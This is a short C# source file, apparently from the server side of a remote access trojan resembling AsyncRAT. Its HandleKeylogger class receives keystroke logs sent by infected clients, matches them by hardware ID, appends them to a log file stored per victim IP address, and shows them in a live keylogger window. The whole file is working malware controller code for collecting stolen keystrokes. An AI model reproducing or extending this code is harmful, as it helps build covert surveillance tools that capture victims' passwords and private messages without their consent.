using System.IO;
using System.Linq;
using System.Windows.Forms;
using MessagePackLib.MessagePack;
using Server.Connection;
using Server.Forms;

namespace Server.Handle_Packet;

internal class HandleKeylogger
{
	public HandleKeylogger(Clients client, MsgPack unpack_msgpack)
	{
		string hwid = unpack_msgpack.ForcePathObject("hwid").GetAsString();
		if (Settings.connectedClients.FirstOrDefault((Clients x) => x.info.hwid == hwid) != null)
		{
			FormTimerKeylog formTimerKeylog = (FormTimerKeylog)Application.OpenForms[hwid + ":TimerKeylog"];
			string path = Path.Combine(Application.StartupPath, "ClientsFolder", client.Ip, "online_keylog.log");
			string asString = unpack_msgpack.ForcePathObject("log").GetAsString();
			File.AppendAllText(path, asString);
			if (formTimerKeylog != null && !string.IsNullOrEmpty(asString))
			{
				formTimerKeylog.AddLog(asString);
			}
		}
	}
}
